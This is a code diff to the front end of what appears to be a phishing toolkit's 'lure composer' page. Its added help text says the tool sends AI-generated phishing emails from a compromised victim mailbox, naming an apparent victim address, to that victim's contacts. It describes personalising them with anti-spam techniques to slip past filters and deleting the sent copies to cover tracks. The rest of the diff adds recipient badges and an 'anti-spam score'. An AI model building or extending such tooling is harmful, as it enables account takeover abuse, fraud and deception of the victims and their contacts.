@@ -8,7 +8,7 @@ import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck } from
 import { fileToBase64 } from "@/lib/utils";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
-  Plus, X, Eye, ShieldAlert, CheckCircle2, Link as LinkIcon,
+  Plus, X, Eye, ShieldAlert, CheckCircle2, AlertTriangle, Link as LinkIcon,
   Search, ChevronDown, Sparkles, FileText, Calendar, Receipt,
   Wand2,
 } from "lucide-react";
@@ -16,6 +16,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { ScrollArea } from "@/components/ui/scroll-area";
+import { SafeEmailViewer } from "@/components/safe-email";
 import {
   Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle,
 } from "@/components/ui/dialog";
@@ -183,7 +184,7 @@ export default function LureComposerPage() {
     setContactsError(null);
     try {
       const data = await fetchContacts(tokenId);
-      setContacts(data.value || []);
+      setContacts(data.contacts || []);
     } catch (err: any) {
       setContactsError(err.message || "Failed to load contacts");
       setContacts([]);
@@ -588,7 +589,43 @@ export default function LureComposerPage() {
       </div>
 
       <div className="flex-1 overflow-y-auto">
-        <div className="mx-auto w-full max-w-[1200px] px-4 sm:px-6 lg:px-8 py-6">
+        <div className="mx-auto w-full max-w-[1200px] px-4 sm:px-6 lg:px-8 py-6 space-y-6">
+          {/* How It Works */}
+          <motion.div
+            initial={{ opacity: 0, y: 8 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="rounded-xl border border-white/5 bg-gradient-to-br from-sky-500/5 to-transparent p-5"
+          >
+            <div className="flex items-start gap-4">
+              <div className="h-10 w-10 rounded-xl bg-sky-500/10 ring-1 ring-sky-500/20 flex items-center justify-center flex-shrink-0">
+                <Fish className="h-5 w-5 text-sky-400" />
+              </div>
+              <div className="flex-1">
+                <h3 className="text-sm font-semibold text-foreground">What are Lure Emails?</h3>
+                <p className="text-xs text-muted-foreground mt-1 leading-relaxed">
+                  Lure emails are AI-generated phishing messages sent from the compromised victim account (e.g., dyanhikov@hotmail.com) 
+                  to target contacts. The AI personalizes the subject and body using the target's name, company context, and 
+                  <strong> anti-spam techniques</strong> to bypass filters. After sending, you can optionally delete the sent item 
+                  from the victim's Sent folder to cover tracks.
+                </p>
+                <div className="flex items-center gap-4 mt-3">
+                  <div className="flex items-center gap-1.5">
+                    <div className="h-2 w-2 rounded-full bg-emerald-400" />
+                    <span className="text-[10px] text-muted-foreground">Office domain (safe)</span>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <div className="h-2 w-2 rounded-full bg-amber-400" />
+                    <span className="text-[10px] text-muted-foreground">External domain (verify)</span>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <div className="h-2 w-2 rounded-full bg-sky-400" />
+                    <span className="text-[10px] text-muted-foreground">AI-generated content</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </motion.div>
+
           <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
             {/* Left: Contacts */}
             <div className="lg:col-span-1">
@@ -686,7 +723,22 @@ export default function LureComposerPage() {
                                 <TokenAvatar email={email || contact.displayName || "?"} size={24} />
                                 <div className="flex-1 min-w-0">
                                   <p className="font-medium text-foreground truncate">{contact.displayName || email || "Unknown"}</p>
-                                  {email && <p className="text-[10px] text-muted-foreground truncate">{email}</p>}
+                                  {email && (
+                                    <div className="flex items-center gap-1.5">
+                                      <p className="text-[10px] text-muted-foreground truncate">{email}</p>
+                                      {email && (
+                                        isOfficeEmail(email) ? (
+                                          <Badge variant="secondary" className="text-[8px] px-1 py-0 bg-emerald-500/10 text-emerald-400 border-emerald-500/20">
+                                            <CheckCircle2 className="h-2 w-2 mr-0.5" /> Office
+                                          </Badge>
+                                        ) : (
+                                          <Badge variant="secondary" className="text-[8px] px-1 py-0 bg-amber-500/10 text-amber-400 border-amber-500/20">
+                                            <AlertTriangle className="h-2 w-2 mr-0.5" /> External
+                                          </Badge>
+                                        )
+                                      )}
+                                    </div>
+                                  )}
                                 </div>
                               </button>
                               <button onClick={() => email && addRecipient(email)} className="flex-shrink-0">
@@ -708,18 +760,29 @@ export default function LureComposerPage() {
               <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                 <label className="text-xs font-medium text-muted-foreground mb-2 block">To</label>
                 <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
-                  {toRecipients.map((email) => (
-                    <Badge
-                      key={email}
-                      variant="secondary"
-                      className="gap-1.5 text-xs bg-primary/10 text-primary border-primary/20"
-                    >
-                      {email}
-                      <button onClick={() => removeRecipient(email)}>
-                        <X className="h-3 w-3" />
-                      </button>
-                    </Badge>
-                  ))}
+                  {toRecipients.map((email) => {
+                    const isOffice = isOfficeEmail(email);
+                    return (
+                      <Badge
+                        key={email}
+                        variant="secondary"
+                        className={cn(
+                          "gap-1.5 text-xs",
+                          isOffice
+                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
+                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
+                        )}
+                      >
+                        <span className="flex items-center gap-1">
+                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
+                          {email}
+                        </span>
+                        <button onClick={() => removeRecipient(email)}>
+                          <X className="h-3 w-3" />
+                        </button>
+                      </Badge>
+                    );
+                  })}
                   <Input
                     value={recipientInput}
                     onChange={(e) => setRecipientInput(e.target.value)}
@@ -749,18 +812,29 @@ export default function LureComposerPage() {
               <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                 <label className="text-xs font-medium text-muted-foreground mb-2 block">Cc</label>
                 <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
-                  {ccRecipients.map((email) => (
-                    <Badge
-                      key={email}
-                      variant="secondary"
-                      className="gap-1.5 text-xs bg-secondary/50 text-foreground border-white/10"
-                    >
-                      {email}
-                      <button onClick={() => removeCcRecipient(email)}>
-                        <X className="h-3 w-3" />
-                      </button>
-                    </Badge>
-                  ))}
+                  {ccRecipients.map((email) => {
+                    const isOffice = isOfficeEmail(email);
+                    return (
+                      <Badge
+                        key={email}
+                        variant="secondary"
+                        className={cn(
+                          "gap-1.5 text-xs",
+                          isOffice
+                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
+                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
+                        )}
+                      >
+                        <span className="flex items-center gap-1">
+                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
+                          {email}
+                        </span>
+                        <button onClick={() => removeCcRecipient(email)}>
+                          <X className="h-3 w-3" />
+                        </button>
+                      </Badge>
+                    );
+                  })}
                   <Input
                     value={ccInput}
                     onChange={(e) => setCcInput(e.target.value)}
@@ -785,18 +859,29 @@ export default function LureComposerPage() {
               <div className="rounded-xl border border-white/5 bg-secondary/10 p-4">
                 <label className="text-xs font-medium text-muted-foreground mb-2 block">Bcc</label>
                 <div className="flex flex-wrap gap-2 min-h-[36px] p-2 rounded-lg border border-white/5 bg-secondary/30 items-center">
-                  {bccRecipients.map((email) => (
-                    <Badge
-                      key={email}
-                      variant="secondary"
-                      className="gap-1.5 text-xs bg-secondary/50 text-foreground border-white/10"
-                    >
-                      {email}
-                      <button onClick={() => removeBccRecipient(email)}>
-                        <X className="h-3 w-3" />
-                      </button>
-                    </Badge>
-                  ))}
+                  {bccRecipients.map((email) => {
+                    const isOffice = isOfficeEmail(email);
+                    return (
+                      <Badge
+                        key={email}
+                        variant="secondary"
+                        className={cn(
+                          "gap-1.5 text-xs",
+                          isOffice
+                            ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
+                            : "bg-amber-500/10 text-amber-400 border-amber-500/20"
+                        )}
+                      >
+                        <span className="flex items-center gap-1">
+                          {isOffice ? <CheckCircle2 className="h-3 w-3" /> : <AlertTriangle className="h-3 w-3" />}
+                          {email}
+                        </span>
+                        <button onClick={() => removeBccRecipient(email)}>
+                          <X className="h-3 w-3" />
+                        </button>
+                      </Badge>
+                    );
+                  })}
                   <Input
                     value={bccInput}
                     onChange={(e) => setBccInput(e.target.value)}
@@ -931,8 +1016,37 @@ export default function LureComposerPage() {
                 </motion.div>
               )}
 
-              {/* Send Button */}
-              <div className="flex justify-end">
+              {/* Send Button + Anti-spam Score */}
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-2">
+                  {antiSpamNotes.length > 0 && (
+                    <div className="flex items-center gap-2 rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-3 py-2">
+                      <Sparkles className="h-3.5 w-3.5 text-emerald-400" />
+                      <span className="text-[11px] text-emerald-400 font-medium">Anti-spam Score</span>
+                      <div className="flex items-center gap-1">
+                        <div className="h-1.5 w-16 rounded-full bg-secondary/50 overflow-hidden">
+                          <div
+                            className="h-full rounded-full bg-emerald-400"
+                            style={{ width: `${Math.min(antiSpamNotes.length * 15, 100)}%` }}
+                          />
+                        </div>
+                        <span className="text-[10px] text-emerald-400 font-bold">{Math.min(antiSpamNotes.length * 15, 100)}%</span>
+                      </div>
+                    </div>
+                  )}
+                  <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground">
+                    <span className="flex items-center gap-1">
+                      <div className="h-2 w-2 rounded-full bg-emerald-400" />
+                      {toRecipients.filter(e => isOfficeEmail(e)).length} office
+                    </span>
+                    <span className="flex items-center gap-1">
+                      <div className="h-2 w-2 rounded-full bg-amber-400" />
+                      {toRecipients.filter(e => !isOfficeEmail(e)).length} external
+                    </span>
+                    <span className="text-muted-foreground">•</span>
+                    <span>{toRecipients.length} total recipients</span>
+                  </div>
+                </div>
                 <Button
                   onClick={handlePreview}
                   className="gap-2 bg-primary hover:bg-primary/90"
@@ -963,19 +1077,29 @@ export default function LureComposerPage() {
             {LURE_TEMPLATES.map((tmpl) => {
               const Icon = tmpl.icon;
               return (
-                <button
+                <motion.button
                   key={tmpl.id}
+                  whileHover={{ scale: 1.01 }}
+                  whileTap={{ scale: 0.99 }}
                   onClick={() => handleGenerateAI(tmpl.id)}
                   className="w-full flex items-start gap-3 p-3 rounded-lg border border-white/5 bg-secondary/10 hover:bg-secondary/20 hover:border-primary/20 transition-all text-left"
                 >
-                  <div className="h-9 w-9 rounded-lg bg-primary/10 flex items-center justify-center flex-shrink-0">
-                    <Icon className="h-4 w-4 text-primary" />
+                  <div className="h-10 w-10 rounded-xl bg-primary/10 ring-1 ring-primary/20 flex items-center justify-center flex-shrink-0">
+                    <Icon className="h-5 w-5 text-primary" />
                   </div>
-                  <div>
+                  <div className="flex-1 min-w-0">
                     <p className="text-sm font-medium text-foreground">{tmpl.label}</p>
                     <p className="text-[11px] text-muted-foreground">{tmpl.description}</p>
+                    <div className="flex items-center gap-2 mt-1.5">
+                      <Badge variant="secondary" className="text-[9px] bg-primary/5 text-primary/80 border-primary/10">
+                        <Sparkles className="h-2.5 w-2.5 mr-1" /> AI-powered
+                      </Badge>
+                      <Badge variant="secondary" className="text-[9px] bg-emerald-500/5 text-emerald-400/80 border-emerald-500/10">
+                        <ShieldAlert className="h-2.5 w-2.5 mr-1" /> Anti-spam
+                      </Badge>
+                    </div>
                   </div>
-                </button>
+                </motion.button>
               );
             })}
           </div>
@@ -1005,10 +1129,13 @@ export default function LureComposerPage() {
             <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
               <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
               {aiPreviewData ? (
-                <div
-                  className="text-sm text-foreground prose prose-invert max-w-none prose-sm"
-                  dangerouslySetInnerHTML={{ __html: aiPreviewData.body }}
-                />
+                <div className="h-[300px] overflow-hidden rounded border border-white/5">
+                  <SafeEmailViewer
+                    htmlContent={aiPreviewData.body}
+                    contentType="html"
+                    className="h-full"
+                  />
+                </div>
               ) : (
                 <p className="text-sm text-muted-foreground">No preview available</p>
               )}
@@ -1095,14 +1222,13 @@ export default function LureComposerPage() {
             )}
             <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
               <p className="text-xs text-muted-foreground mb-1">Body preview:</p>
-              {contentType === "HTML" ? (
-                <div
-                  className="text-sm text-foreground prose prose-invert max-w-none prose-sm"
-                  dangerouslySetInnerHTML={{ __html: body }}
+              <div className="h-[300px] overflow-hidden rounded border border-white/5">
+                <SafeEmailViewer
+                  htmlContent={body}
+                  contentType={contentType === "HTML" ? "html" : "text"}
+                  className="h-full"
                 />
-              ) : (
-                <pre className="text-sm text-foreground whitespace-pre-wrap font-mono">{body}</pre>
-              )}
+              </div>
             </div>
           </div>
           <DialogFooter>
